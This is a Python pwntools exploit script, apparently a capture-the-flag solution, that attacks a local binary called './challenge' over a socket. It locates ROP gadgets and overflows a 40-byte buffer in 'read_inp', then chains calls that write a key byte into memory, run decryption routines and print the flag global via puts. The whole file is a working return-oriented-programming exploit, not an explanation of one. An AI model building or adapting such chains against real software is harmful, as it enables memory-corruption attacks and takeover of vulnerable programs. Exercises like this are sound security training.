#!/usr/bin/env python3

from pwn import *
from typing import Union


def get_gadget(elf: ELF, instructions: Union[list, tuple]) -> bytes:
    gadget = ROP(elf).find_gadget(instructions)
    return p64(gadget.address)


def search_instructions(elf: ELF, func_name: str, instruction: str, bytes_range=100):
    all_calls = elf.disasm(elf.symbols[func_name], bytes_range).split('\n')
    all_calls_addr = []

    for ins in all_calls:
        if instruction in ins:
            addr_str = ins.split(':')[0].strip()
            all_calls_addr.append(p64(int(addr_str, 16)))
    return all_calls_addr

elf = ELF("./challenge", checksec=False)

# TODO fin a way to call [] and `call` instructions
gadget_popr14       = get_gadget(elf, ['pop r14', 'ret'])
gadget_popr15       = get_gadget(elf, ['pop r15', 'ret'])
gadget_loadr15inr14 = search_instructions(elf, 'gogo', 'mov    QWORD PTR [r14], r15')[0]
gadget_poprdi       = search_instructions(elf, 'gogo', 'pop    rdi')[0]
vulnerablefunc      = p64(elf.symbols.get("read_inp"))
firstpart           = p64(elf.symbols.get("first_part"))
secondpart          = p64(elf.symbols.get("second_part"))
flag_global         = p64(elf.symbols.get("flag"))
key_global          = p64(elf.symbols.get("key"))
call_puts           = search_instructions(elf, 'read_inp', 'call   0x400')[0]
key_char            = p64(ord('%'))

pad = b'p' * 8
buf = b'a' * 40
f = vulnerablefunc

p = remote("localhost", 1102) #process("./challenge") # 

# write % to key
gogo = b''
gogo += buf + gadget_popr14 + key_global + f     # dest
gogo += buf + gadget_popr15 + key_char + f       # src
gogo += buf + gadget_loadr15inr14 + f + pad      # src to dest

# decrypt files into global
gogo += buf + firstpart + f + pad
gogo += buf + secondpart + f + pad

# print global
gogo += buf + gadget_poprdi + flag_global + call_puts

p.sendline(gogo)


with open("/tmp/rop", "wb") as f:
    f.write(gogo)

p.recvuntil("PoC")
log.success("PoC" + p.recvline().decode())
